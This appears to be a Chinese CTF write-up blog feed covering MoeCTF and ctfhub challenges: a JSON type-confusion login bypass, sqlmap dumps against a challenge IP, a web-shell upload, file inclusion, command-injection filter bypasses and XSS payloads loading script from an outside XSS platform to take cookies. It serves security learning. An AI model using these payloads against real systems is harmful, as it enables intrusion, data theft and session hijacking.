class="hljs-string">&quot;admin&quot;</span>:<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;admin&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                <span class="hljs-keyword">if</span> params.get(<span class="hljs-string">&quot;username&quot;</span>) == params.get(<span class="hljs-string">&quot;password&quot;</span>):<br>                    self.send_response(<span class="hljs-number">403</span>)<br>                    self.end_headers()<br>                    self.wfile.write(<span class="hljs-string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;same&quot;</span>)<br>                    <span class="hljs-keyword">return</span><br>                hashed = gethash(params.get(<span class="hljs-string">&quot;username&quot;</span>),params.get(<span class="hljs-string">&quot;password&quot;</span>))<br>                <span class="hljs-comment">#构造，使哈希值计算后为0</span><br>                <span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> hashed_users.items():<br>                    <span class="hljs-keyword">if</span> hashed == v:<br>                        data = &#123;<br>                            <span class="hljs-string">&quot;user&quot;</span>:k,<br>                            <span class="hljs-string">&quot;hash&quot;</span>:hashed,<br>                            <span class="hljs-string">&quot;flag&quot;</span>: FLAG <span class="hljs-keyword">if</span> k == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span><br>                        &#125;<br>                        self.send_response(<span class="hljs-number">200</span>)<br>                        self.end_headers()<br>                        self.wfile.write(json.dumps(data).encode())<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;success&quot;</span>)<br>                        <span class="hljs-keyword">return</span><br>                self.send_response(<span class="hljs-number">403</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;Invalid username or password&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                self.send_response(<span class="hljs-number">404</span>)<br>                self.end_headers()<br>                self.wfile.write(<span class="hljs-string">b&quot;404 Not Found&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br>            self.send_response(<span class="hljs-number">500</span>)<br>            self.end_headers()<br>            self.wfile.write(<span class="hljs-string">b&quot;500 Internal Server Error&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    server = http.server.HTTPServer((<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">9999</span>), MyHandler)<br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p>而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？</p><p>其实只需要传入“1”和1就可以绕过</p><p>从而得到hashed值为0，即可拿到flag，这里利用了json解析的特性，{“username”:1}中username的数据类型为int，而{“username”:”1”}中username的数据类型为str，所以在**&#x3D;&#x3D;**比较中数据类型不同的值结果为False</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;<span class="hljs-subst">&#123;salt&#125;</span>[<span class="hljs-subst">&#123;item&#125;</span>]<span class="hljs-subst">&#123;salt&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure><p>而这条语句中会自动将不同的数据类型都转换为str类型，从而达到了我们预期的目的，构建一个python脚本，将发送的json数据base64加密五次就行，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = <span class="hljs-string">&quot;http://localhost:51662/login&quot;</span><br>username = <span class="hljs-string">&quot;\&quot;1\&quot;&quot;</span><br>password = <span class="hljs-string">&quot;1&quot;</span><br>jsondata = <span class="hljs-string">&quot;&#123;\&quot;username\&quot;:&quot;</span>+<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;username&#125;</span>&quot;</span>+<span class="hljs-string">&quot;,\&quot;password\&quot;:&quot;</span>+<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;password&#125;</span>&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;jsondata = &#125;</span>&quot;</span>)<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    jsondata = base64.b64encode(<span class="hljs-built_in">str</span>(jsondata).encode()).decode()<br>data = <span class="hljs-string">&quot;&#123;\&quot;params\&quot;:\&quot;&quot;</span>+<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;jsondata&#125;</span>\&quot;&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data = &#125;</span>&quot;</span>)<br>req = requests.post(url=url,data=data).text<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;req = &#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h2><p>下一题的密码: moectf{Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!}</p><p>发现个可以访问的</p><p>顺便总结一下发现一些隐藏的可访问页面</p><p>1)工具扫描:dirsearch，御剑</p><p>2)网络请求发现</p><img src="/2023/09/28/MoectfWP/image-20230910003217010.png" class title="image-20230910003217010"><p>内容如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: Visitor auto recorder</span><br><span class="hljs-comment">Description: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!</span><br><span class="hljs-comment">Author: KoKoMi</span><br><span class="hljs-comment">  Still in development! :)</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">// 不许偷看！这些代码我还在调试呢！</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// 加载数据库配置，暂时用硬编码绝对路径</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;/var/www/html/wordpress/&#x27;</span> . <span class="hljs-string">&#x27;wp-config.php&#x27;</span>);<br><br><span class="hljs-variable">$db_user</span> = DB_USER; <span class="hljs-comment">// 数据库用户名</span><br><span class="hljs-variable">$db_password</span> = DB_PASSWORD; <span class="hljs-comment">// 数据库密码</span><br><span class="hljs-variable">$db_name</span> = DB_NAME; <span class="hljs-comment">// 数据库名称</span><br><span class="hljs-variable">$db_host</span> = DB_HOST; <span class="hljs-comment">// 数据库主机</span><br><br><span class="hljs-comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span><br><span class="hljs-comment">// 这些是临时的代码</span><br><br><span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br><span class="hljs-variable">$user_agent</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;user_agent&#x27;</span>];<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;time&#x27;</span>]);<br><br><span class="hljs-variable">$mysqli</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-variable">$db_host</span>, <span class="hljs-variable">$db_user</span>, <span class="hljs-variable">$db_password</span>, <span class="hljs-variable">$db_name</span>);<br><br><span class="hljs-comment">// 检查连接是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mysqli</span>-&gt;connect_errno) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据库连接失败: &#x27;</span> . <span class="hljs-variable">$mysqli</span>-&gt;connect_error;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-variable">$query</span> = <span class="hljs-string">&quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;<span class="hljs-subst">$ip</span>&#x27;, &#x27;<span class="hljs-subst">$user_agent</span>&#x27;, <span class="hljs-subst">$time</span>)&quot;</span>;<br><br><span class="hljs-comment">// 执行插入</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$mysqli</span>, <span class="hljs-variable">$query</span>);<br><br><span class="hljs-comment">// 检查插入是否成功</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入成功&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;数据插入失败: &#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$mysqli</span>);<br>&#125;<br><br><span class="hljs-comment">// 关闭数据库连接</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$mysqli</span>);<br><br><span class="hljs-comment">//gpt真好用</span><br></code></pre></td></tr></table></figure><p>直接sqlmap</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">python sqlmap.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">101.42</span>.<span class="hljs-number">178.83</span>:<span class="hljs-number">7770</span><span class="hljs-regexp">/wordpress/</span>wp-content<span class="hljs-regexp">/plugins/</span>visitor-logging<span class="hljs-regexp">/logger.php/</span>?id=<span class="hljs-number">1</span> --data time=<span class="hljs-number">1</span><br><br>python sqlmap.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">101.42</span>.<span class="hljs-number">178.83</span>:<span class="hljs-number">7770</span><span class="hljs-regexp">/wordpress/</span>wp-content<span class="hljs-regexp">/plugins/</span>visitor-logging<span class="hljs-regexp">/logger.php/</span>?id=<span class="hljs-number">1</span> --data time=<span class="hljs-number">1</span> --dbs<br><br>python sqlmap.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">101.42</span>.<span class="hljs-number">178.83</span>:<span class="hljs-number">7770</span><span class="hljs-regexp">/wordpress/</span>wp-content<span class="hljs-regexp">/plugins/</span>visitor-logging<span class="hljs-regexp">/logger.php/</span>?id=<span class="hljs-number">1</span> --data time=<span class="hljs-number">1</span> -D wordpress --tables<br><br>python sqlmap.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">101.42</span>.<span class="hljs-number">178.83</span>:<span class="hljs-number">7770</span><span class="hljs-regexp">/wordpress/</span>wp-content<span class="hljs-regexp">/plugins/</span>visitor-logging<span class="hljs-regexp">/logger.php/</span>?id=<span class="hljs-number">1</span> --data time=<span class="hljs-number">1</span> -D wordpress -T secret_of_kokomi --columns<br><br>python sqlmap.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">101.42</span>.<span class="hljs-number">178.83</span>:<span class="hljs-number">7770</span><span class="hljs-regexp">/wordpress/</span>wp-content<span class="hljs-regexp">/plugins/</span>visitor-logging<span class="hljs-regexp">/logger.php/</span>?id=<span class="hljs-number">1</span> --data time=<span class="hljs-number">1</span> -D wordpress -T secret_of_kokomi -C content --dump<br></code></pre></td></tr></table></figure><h2 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2><p>F12查看源码发现script有upload.php这东西，查看该文件文件代码，并进行分析，重点是以下这个</p><img src="/2023/09/28/MoectfWP/image-20230818205719402.png" class title="image-20230818205719402"><p>这部分代码检查文件名后缀是否为<code>png</code>。首先，通过使用<code>explode()</code>函数将文件名按<code>.</code>进行分割，然后检查第二个分割段是否为<code>png</code>，如果不是，则返回错误消息。</p><p>既要确保第二部分是.png又要确保最后是.png</p><p>于是构造.png.php.png一句话木马文件，抓包后修改后缀</p><p>AntSword连接即可，然后在根目录下发现flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF_WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>RCE</title>
    <link href="/2023/09/28/RCE_learn/"/>
    <url>/2023/09/28/RCE_learn/</url>
    
    <content type="html"><![CDATA[<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><p>好文:<a href="https://xz.aliyun.com/t/9360#toc-6">PHP的无参数RCE - 先知社区 (aliyun.com)</a></p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">Adworld做题后得到的一些payload<br><br>fileclude<br>file1=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php&amp;file2=php:<span class="hljs-regexp">//i</span>nput<br><br>fileinclude<br>php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag<br><br>file_include<br>?filename=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">//</span>convert.iconv.SJIS*.UCS-<span class="hljs-number">4</span>*/resource=flag.php<br></code></pre></td></tr></table></figure><p>↓这题来自ctfhub”文件包含”一题</p><img src="/2023/09/28/RCE_learn/image-20230815175204012.png" class title="image-20230815175204012"><img src="/2023/09/28/RCE_learn/image-20230815175216274.png" class title="image-20230815175216274">**<p>怎么用呢，给他&#x2F;?file&#x3D;shell.txt</p><p>然后根据给的参数传命令<img src="/2023/09/28/RCE_learn/image-20230815175317247.png" class title="image-20230815175317247"></p><p>先ls &#x2F;，后cat即可</p><h4 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>↓这题来自ctfhub”php:&#x2F;&#x2F;input”一题</p><img src="/2023/09/28/RCE_learn/image-20230815180341020.png" class title="image-20230815180341020"><img src="/2023/09/28/RCE_learn/image-20230815180419983.png" class title="image-20230815180419983"><p>接着post php代码即可</p><h4 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h4><p>↓这题来自ctfhub”远程包含”一题</p><p>给咱一个phpinfo那么必然有他的道理</p><p>PHP的配置选项allow_url_include为<strong>ON</strong>的话，则include&#x2F;require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(<strong>R</strong>emote <strong>F</strong>ile <strong>I</strong>nclusion RFI)”。</p><p><code>allow_url_fopen = On</code> 是否允许打开远程文件<br><code>allow_url_include = On</code> 是否允许include&#x2F;require远程文件</p><p>解法一:跟上一题一样</p><p>解法二:!<img src="/2023/09/28/RCE_learn/image-20230815182644961.png" class title="image-20230815182644961"></p><p>然后AntSword连接</p><h4 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h4><p>↓这题来自ctfhub”读取源代码”一题</p><img src="/2023/09/28/RCE_learn/image-20230815183122559.png" class title="image-20230815183122559"><img src="/2023/09/28/RCE_learn/image-20230815183142820.png" class title="image-20230815183142820"><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="无过滤"><a href="#无过滤" class="headerlink" title="无过滤"></a>无过滤</h4><p>↓这题来自ctfhub”命令注入-无过滤”一题</p><p>&#x2F;?ip&#x3D;127.0.0.1</p><p>然后cat</p><p>没有回显-&gt;查看网页源码</p><p>在解题过程中检查页面回显时，发现无回显并不是因为管道符不正确。而是因为在网页中，浏览器会将文本内容解析为 HTML 代码，并根据 HTML 代码生成相应的网页。如果你的文本中包含特殊字符，浏览器就会将这些特殊字符解析为 HTML 标签，导致文本内容无法在网页中正常显示。那么这时候你可以通过以 base64 编码形式进行解析，浏览器会输出 base64 编码后的文本进行输出，不执行 HTML 解析，所以可以在网页中正常显示</p><p>如&#x2F;?ip&#x3D;127.0.0.1|cat flag.php|base64</p><img src="/2023/09/28/RCE_learn/image-20230815184958947.png" class title="image-20230815184958947"><h4 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h4><p>可以用less,more,<strong>tail</strong>等命令读取flag</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">more:</span>一页一页的显示档案内容<br><span class="hljs-symbol">less:</span>与 more 类似<br><span class="hljs-symbol">head:</span>查看头几行<br><span class="hljs-symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br><span class="hljs-symbol">tail:</span>查看尾几行<br>nl：显示的时候，顺便输出行号<br><span class="hljs-symbol">od:</span>以二进制的方式读取档案内容<br><span class="hljs-symbol">vi:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">vim:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">sort:</span>可以查看<br><span class="hljs-symbol">uniq:</span>可以查看<br>file -f:报错出具体内容<br>sh /flag <span class="hljs-number">2</span>&gt;%<span class="hljs-number">261</span> <span class="hljs-comment">//报错出文件内容</span><br></code></pre></td></tr></table></figure><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>这里是空格被正则表达式过滤了<br>以下字符都可以代替空格：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">&lt;,&lt;&gt;,%20(space),%09(tab),\$IFS\$9, \$&#123;IFS&#125;,$IFS,\x20<br></code></pre></td></tr></table></figure><h4 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h4><p>这道题过滤了(||&amp;)这些符号,用分号即可</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>;ls<br><span class="hljs-number">127.0.0.1</span>;cat flag_234656091385.php<br></code></pre></td></tr></table></figure><h4 id="过滤目录分隔符"><a href="#过滤目录分隔符" class="headerlink" title="过滤目录分隔符"></a>过滤目录分隔符</h4><p>可以先cd后cat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?ip=127.0.0.1;<span class="hljs-built_in">cd</span> flag_is_here;<span class="hljs-built_in">cat</span> flag_31961112137507.php<br></code></pre></td></tr></table></figure><h4 id="好用的payload"><a href="#好用的payload" class="headerlink" title="好用的payload"></a>好用的payload</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ls /<br>`echo<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-string">&#x27;bHMgLw==&#x27;</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>|<span class="hljs-meta">%</span><span class="hljs-number">09</span>base<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>-d`<br><br>cat /flag<br>`echo<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-string">&#x27;Y2F0IC9mbGFn==&#x27;</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>|<span class="hljs-meta">%</span><span class="hljs-number">09</span>base<span class="hljs-number">64</span><span class="hljs-meta">%</span><span class="hljs-number">09</span>-d`<br></code></pre></td></tr></table></figure><h4 id="综合过滤练习"><a href="#综合过滤练习" class="headerlink" title="综合过滤练习"></a>综合过滤练习</h4><p>↓这题来自ctfhub”命令注入-综合过滤练习”一题</p><img src="/2023/09/28/RCE_learn/image-20230815212516675.png" class title="image-20230815212516675"><p>这道题过滤了|,&amp;,;,空格,cat,flag,ctfhub,&#x2F;符号</p><p>命令分隔符用%0a代替</p><p>构造payload&#x3D;?ip&#x3D;127.0.0.1%0als%09*查看所有文件</p><img src="/2023/09/28/RCE_learn/image-20230815213444515.png" class title="image-20230815213444515"><p>发现flag_is_here文件夹，进入:payload&#x3D;?ip&#x3D;127.0.0.1%0acd%09*_is_here(这里空格用%09代替)</p><p>并cat，用tail绕过</p><p>?ip&#x3D;127.0.0.1%0Acd%09*_is_here%0Atail%09*_300251234643.php</p><h4 id="通用匹配符号"><a href="#通用匹配符号" class="headerlink" title="通用匹配符号"></a>通用匹配符号</h4><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs lua">*号          匹配<span class="hljs-number">0</span>到任意字符 <br>?号          匹配单个字符 <br><span class="hljs-string">[[:alpha:]]</span>       单个字母 <br><span class="hljs-string">[[:lower:]]</span>      单个小写字母 <br><span class="hljs-string">[[:upper:]]</span>      单个大写字母 <br><span class="hljs-string">[[:digit:]]</span>         单个数字 <br><span class="hljs-string">[[:punct:]]</span>      单个符号 <br><span class="hljs-string">[[:space:]]</span>      单个空格 <br><span class="hljs-string">[[:alnum:]]</span>     单个数字或字母 <br><span class="hljs-string">[[:punct:][:upper:]]</span>        单个符号或单个大写字母 <br>[<span class="hljs-number">1</span><span class="hljs-number">-9</span>]       <span class="hljs-number">1</span>位，这位是<span class="hljs-number">1</span><span class="hljs-number">-9</span>的任意数字 <br>[!<span class="hljs-number">3</span><span class="hljs-number">-5</span>]      <span class="hljs-number">1</span>位，不是<span class="hljs-number">3</span><span class="hljs-number">-5</span>的数字 <br>[^<span class="hljs-number">3</span><span class="hljs-number">-5</span>]     <span class="hljs-number">1</span>位，不是<span class="hljs-number">3</span><span class="hljs-number">-5</span>的数字 <br>[a-z]        <span class="hljs-number">1</span>位，a-z的任意字母 <br>&#123;<span class="hljs-number">1</span>…<span class="hljs-number">3</span>&#125;      <span class="hljs-number">3</span>个，<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span><br>&#123;<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>&#125;    <span class="hljs-number">3</span>个<span class="hljs-number">1</span>，<span class="hljs-number">4</span>，<span class="hljs-number">7</span>这三个数<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/09/28/XSS/"/>
    <url>/2023/09/28/XSS/</url>
    
    <content type="html"><![CDATA[<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>↓这题来自ctfhub”xss-反射型”一题</p><p>用XSS平台进行xss测试</p><img src="/2023/09/28/XSS/image-20230816220054963.png" class title="image-20230816220054963"><p>回到平台查看cookie，得到flag</p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>↓这题来自ctfhub”xss-存储型”一题</p><p>存储型与反射型的区别就在与存储型是存储进数据库的，用户只要打开链接，就会被xss注入攻击</p><p>与上题相似，只不过第二个框内就是靶场的url</p><h3 id="DOM反射"><a href="#DOM反射" class="headerlink" title="DOM反射"></a>DOM反射</h3><p>↓这题来自ctfhub”xss-DOM反射”一题</p><img src="/2023/09/28/XSS/image-20230816224251734.png" class title="image-20230816224251734"><p>在第二个框输入url，然后xss平台获取flag即可</p><h3 id="DOM跳转"><a href="#DOM跳转" class="headerlink" title="DOM跳转"></a>DOM跳转</h3><p>↓这题来自ctfhub”xss-DOM跳转”一题</p><p>进入网站，直接查看源代码，下面是关键代码，这里有<a href="https://so.csdn.net/so/search?q=xss%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">xss漏洞</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>        <span class="hljs-keyword">var</span> target = location.<span class="hljs-property">search</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;=&quot;</span>)<br>        <span class="hljs-keyword">if</span> (target[<span class="hljs-number">0</span>].<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>) == <span class="hljs-string">&quot;jumpto&quot;</span>) &#123;<br>            location.<span class="hljs-property">href</span> = target[<span class="hljs-number">1</span>];<br>        &#125;<br>&lt;/script&gt;<br><br></code></pre></td></tr></table></figure><img src="/2023/09/28/XSS/image-20230816225517098.png" class title="image-20230816225517098"><img src="/2023/09/28/XSS/image-20230816225532360.png" class title="image-20230816225532360"><p>接着在第二个框输入url，然后xss平台获取flag即可</p><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>方法与前几题相同</p><p>用&#x2F;**&#x2F;代替空格即可</p><h3 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h3><p>这次直接浏览器输入payload，发现 <code>script </code>被过滤掉了</p><p>碰到这种情况不要慌，下面给出两种方法绕过过滤关键字。</p><p>双写绕过</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&lt;<span class="hljs-regexp">/textarea&gt;&#x27;&quot;&gt;&lt;scrscriptipt src=http:/</span><span class="hljs-regexp">/xsscom.com/</span><span class="hljs-regexp">/cZ2vvZ&gt;&lt;/</span>scrscriptipt&gt;<br></code></pre></td></tr></table></figure><p>大小写绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span>&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">Script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xsscom.com//cZ2vvZ</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scRipt</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>first说说</title>
    <link href="/2023/09/18/first%E8%AF%B4%E8%AF%B4/"/>
    <url>/2023/09/18/first%E8%AF%B4%E8%AF%B4/</url>
    
